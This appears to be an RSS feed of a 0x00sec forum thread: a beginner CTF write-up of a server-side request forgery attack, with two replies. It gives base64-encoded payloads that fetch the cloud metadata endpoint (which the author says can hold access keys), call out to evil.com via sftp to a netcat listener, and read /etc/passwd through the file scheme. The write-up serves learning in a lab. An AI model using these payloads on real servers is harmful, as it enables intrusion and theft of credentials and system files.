@@ -1,0 +1,271 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Writeup: 0x00sec CTF - Exercise #5</title>
+    <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658</link>
+    <description>![header-ctf-0x00sec|690x269](upload://wOiVhJMMswDlMlkqZB8w6ZTLfjQ.png) 
+
+# Writeup CTF 0x00sec Web - Exercise #5
+
+Another day, another ctf challenge. This time no. 5 of the web exercises
+
+As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early :wink:
+
+However, I think this process is also very interesting and I learned a lot!
+
+## The Challenge
+
+Like always the first thing we do, is to check out the source code of the login page. As we can find a lot of useful information in there.
+
+![01-page-source|690x481](upload://7Yfs58aQQG85Ryt6nTCgr34Vd6Z.png) 
+
+Like in the previous exercises we see the hint in the HTML comment.
+
+```html
+
+&lt;!-- TODO: --&gt;
+
+&lt;!-- * Stop relying on Base64! I&#39;m sorry... --&gt;
+
+```
+
+Furthermore, we see some hidden inputs, which seem interesting.
+
+```html
+
+&lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;87.123.162.39&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;p&quot; value=&quot;aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ==&quot;&gt;
+
+```
+
+Now let&#39;s decode the base64 string:
+
+```html
+
+➜ echo &quot;aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ==&quot; | base64 -D
+
+https://ipinfo.io/87.123.162.39%
+
+```
+
+So let&#39;s check and click on Login to see what happens.
+
+If we do so, we should see the the output of ipinfo.io.
+
+We can double check with
+
+```html
+
+curl https://ipinfo.io/87.123.162.39
+
+```
+
+We can now tinker a bit with it. Let&#39;s for example base64 encode `http://www.google.de` and pass it as the value.
+
+![02-google|690x285](upload://gK1J7KehdXO9AtXDmaJPOtTuEnE.png) 
+
+And we see a very weird looking google page. So we can assume, what&#39;s happening in the backend is that the server grabs the base64 encoded string, decodes it, runs maybe a curl on it and renders the results.
+
+But as we control the command parameter, the site is vulnerable to a Server [Side Request Forgery Attack](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+
+## The Attack
+
+Well, we know the vulnerability now, but we do not really know how to abuse it.
+
+Now comes the fun exploration part. We can try different inputs to see what is possible.
+
+However, if you are not interested in the exploration and dead ends I&#39;ve reached, you can skip to URL Scheme.
+
+### Exploration
+
+To be honest I was also too much in Hack The Box mood, because I solved a box prior to the challenge and kind of gone bananas with it. I wanted to see what we can get out of it. Even tho, we know that this are **Web** exercises.
+
+So I did a nmap scan, to see whats running there.
+
+![05-nmap|690x412](upload://uuehzs7T2KWWt14vCLHMHVXwh4d.png) 
+
+And I also did a `whois 138.197.209.37` which returned that the IP belongs to Digital Ocean.
+
+### Cloud Meta Data
+
+Well, we know that this is a Digital Ocean Droplet. So these cloud providers have some APIs for meta data. Which can hold interesting information like access keys.
+
+I do not know the URL off my head so I checked [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-digital-ocean) and encoded `http://169.254.169.254/metadata/v1.json` as base64 and submitted it.
+
+And we got the response with tons of information. But nothing very useful for now.
+
+### URL Scheme
+
+Currently we are providing an URL with `http` so that the client knows, how to handle it. Now it would be interesting to see if we can access files on the server.
+
+Can we communicate over other protocols?
+
+Spoiler alert: Yes, we can!
+
+I&#39;ve just grabbed the examples from PayloadsAllTheThings and base64 encoded
+
+```html
+
+sftp://evil.com:1337/
+
+```
+
+But I replaced evil.com with my own server, where I started a netcat listener.
+
+![06-sftp|395x116](upload://iLEkxAw5D4wakhLspfzR7X2nhvs.png) 
+
+Then I send the request with the encoded sftp url and got a response!
+
+![07-sftp2|349x107](upload://93mkXdIuULETOA3280NbvHAfYX0.png) 
+
+Still cool, but this will get us nowhere. It can&#39;t be that hard right?
+
+But what about the `file` scheme?
+
+So let&#39;s try to encode `file:///etc/passwd` as base64 and submit it.
+We can again either use [CyberChef](https://gchq.github.io/CyberChef/) or your terminal with
+
+```
+echo -n &#39;file:///etc/passwd&#39; | base64
+```
+Change the input value and yep! We can read files. And if we take a closer look to the content of `/etc/passwd` we can see the flag.
+
+## Conclusion
+
+Very cool vulnerability which can be abused in a lot of ways.
+
+- [https://hackerone.com/reports/115748](https://hackerone.com/reports/115748)</description>
+    
+    <lastBuildDate>Tue, 28 Apr 2020 13:01:19 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Writeup: 0x00sec CTF - Exercise #5</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/4</link>
+        <pubDate>Thu, 20 Aug 2020 07:18:01 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-20658-4</guid>
+        <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss">Writeup: 0x00sec CTF - Exercise #5</source>
+      </item>
+      <item>
+        <title>Writeup: 0x00sec CTF - Exercise #5</title>
+        <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
+        <description><![CDATA[
+            <p>Yep, you can totally do this in Burp or any other proxy.</p>
+<p>However, I try to avoid Burp in my write-ups. Simply because you do not need it to solve the CTFs. Furthermore these CTFs are designed for beginners. So it is always good to know the basics and how to handle this without tools like burp.</p>
+          <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/3</link>
+        <pubDate>Tue, 28 Apr 2020 13:01:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-20658-3</guid>
+        <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss">Writeup: 0x00sec CTF - Exercise #5</source>
+      </item>
+      <item>
+        <title>Writeup: 0x00sec CTF - Exercise #5</title>
+        <dc:creator><![CDATA[DIVYA_Chawla]]></dc:creator>
+        <description><![CDATA[
+            <p>Bro, capture the request in the Burp and and then use this payload to get the script, ZmlsZTovLy9ldGMvcGFzc3dk (file:///etc/passwd)</p>
+          <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/2</link>
+        <pubDate>Tue, 28 Apr 2020 08:49:43 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-20658-2</guid>
+        <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss">Writeup: 0x00sec CTF - Exercise #5</source>
+      </item>
+      <item>
+        <title>Writeup: 0x00sec CTF - Exercise #5</title>
+        <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
+        <description><![CDATA[
+            <p><img src="https://0x00sec.org/images/transparent.png" alt="header-ctf-0x00sec" data-orig-src="upload://wOiVhJMMswDlMlkqZB8w6ZTLfjQ.png" width="690" height="269"></p>
+<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#5</span>
+</h1>
+<p>Another day, another ctf challenge. This time no. 5 of the web exercises</p>
+<p>As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+<p>However, I think this process is also very interesting and I learned a lot!</p>
+<h2>The Challenge</h2>
+<p>Like always the first thing we do, is to check out the source code of the login page. As we can find a lot of useful information in there.</p>
+<p><img src="https://0x00sec.org/images/transparent.png" alt="01-page-source" data-orig-src="upload://7Yfs58aQQG85Ryt6nTCgr34Vd6Z.png" width="690" height="481"></p>
+<p>Like in the previous exercises we see the hint in the HTML comment.</p>
+<pre><code class="lang-auto">
+&lt;!-- TODO: --&gt;
+
+&lt;!-- * Stop relying on Base64! I'm sorry... --&gt;
+
+</code></pre>
+<p>Furthermore, we see some hidden inputs, which seem interesting.</p>
+<pre><code class="lang-auto">
+&lt;input type="hidden" name="ip" value="87.123.162.39"&gt;
+
+&lt;input type="hidden" name="p" value="aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ=="&gt;
+
+</code></pre>
+<p>Now let’s decode the base64 string:</p>
+<pre><code class="lang-auto">
+➜ echo "aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ==" | base64 -D
+
+https://ipinfo.io/87.123.162.39%
+
+</code></pre>
+<p>So let’s check and click on Login to see what happens.</p>
+<p>If we do so, we should see the the output of <a href="http://ipinfo.io" rel="noopener nofollow ugc">ipinfo.io</a>.</p>
+<p>We can double check with</p>
+<pre><code class="lang-auto">
+curl https://ipinfo.io/87.123.162.39
+
+</code></pre>
+<p>We can now tinker a bit with it. Let’s for example base64 encode <code>http://www.google.de</code> and pass it as the value.</p>
+<p><img src="https://0x00sec.org/images/transparent.png" alt="02-google" data-orig-src="upload://gK1J7KehdXO9AtXDmaJPOtTuEnE.png" width="690" height="285"></p>
+<p>And we see a very weird looking google page. So we can assume, what’s happening in the backend is that the server grabs the base64 encoded string, decodes it, runs maybe a curl on it and renders the results.</p>
+<p>But as we control the command parameter, the site is vulnerable to a Server <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="noopener nofollow ugc">Side Request Forgery Attack</a></p>
+<h2>The Attack</h2>
+<p>Well, we know the vulnerability now, but we do not really know how to abuse it.</p>
+<p>Now comes the fun exploration part. We can try different inputs to see what is possible.</p>
+<p>However, if you are not interested in the exploration and dead ends I’ve reached, you can skip to URL Scheme.</p>
+<h3>Exploration</h3>
+<p>To be honest I was also too much in Hack The Box mood, because I solved a box prior to the challenge and kind of gone bananas with it. I wanted to see what we can get out of it. Even tho, we know that this are <strong>Web</strong> exercises.</p>
+<p>So I did a nmap scan, to see whats running there.</p>
+<p><img src="https://0x00sec.org/images/transparent.png" alt="05-nmap" data-orig-src="upload://uuehzs7T2KWWt14vCLHMHVXwh4d.png" width="690" height="412"></p>
+<p>And I also did a <code>whois 138.197.209.37</code> which returned that the IP belongs to Digital Ocean.</p>
+<h3>Cloud Meta Data</h3>
+<p>Well, we know that this is a Digital Ocean Droplet. So these cloud providers have some APIs for meta data. Which can hold interesting information like access keys.</p>
+<p>I do not know the URL off my head so I checked <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-digital-ocean" rel="noopener nofollow ugc">PayloadsAllTheThings</a> and encoded <code>http://169.254.169.254/metadata/v1.json</code> as base64 and submitted it.</p>
+<p>And we got the response with tons of information. But nothing very useful for now.</p>
+<h3>URL Scheme</h3>
+<p>Currently we are providing an URL with <code>http</code> so that the client knows, how to handle it. Now it would be interesting to see if we can access files on the server.</p>
+<p>Can we communicate over other protocols?</p>
+<p>Spoiler alert: Yes, we can!</p>
+<p>I’ve just grabbed the examples from PayloadsAllTheThings and base64 encoded</p>
+<pre><code class="lang-auto">
+sftp://evil.com:1337/
+
+</code></pre>
+<p>But I replaced <a href="http://evil.com" rel="noopener nofollow ugc">evil.com</a> with my own server, where I started a netcat listener.</p>
+<p><img src="https://0x00sec.org/images/transparent.png" alt="06-sftp" data-orig-src="upload://iLEkxAw5D4wakhLspfzR7X2nhvs.png" width="395" height="116"></p>
+<p>Then I send the request with the encoded sftp url and got a response!</p>
+<p><img src="https://0x00sec.org/images/transparent.png" alt="07-sftp2" data-orig-src="upload://93mkXdIuULETOA3280NbvHAfYX0.png" width="349" height="107"></p>
+<p>Still cool, but this will get us nowhere. It can’t be that hard right?</p>
+<p>But what about the <code>file</code> scheme?</p>
+<p>So let’s try to encode <code>file:///etc/passwd</code> as base64 and submit it.<br>
+We can again either use <a href="https://gchq.github.io/CyberChef/" rel="noopener nofollow ugc">CyberChef</a> or your terminal with</p>
+<pre><code class="lang-auto">echo -n 'file:///etc/passwd' | base64
+</code></pre>
+<p>Change the input value and yep! We can read files. And if we take a closer look to the content of <code>/etc/passwd</code> we can see the flag.</p>
+<h2>Conclusion</h2>
+<p>Very cool vulnerability which can be abused in a lot of ways.</p>
+<ul>
+<li><a href="https://hackerone.com/reports/115748" rel="noopener nofollow ugc">https://hackerone.com/reports/115748</a></li>
+</ul>
+          <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658/1</link>
+        <pubDate>Mon, 20 Apr 2020 15:14:24 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-20658-1</guid>
+        <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss">Writeup: 0x00sec CTF - Exercise #5</source>
+      </item>
+  </channel>
+</rss>
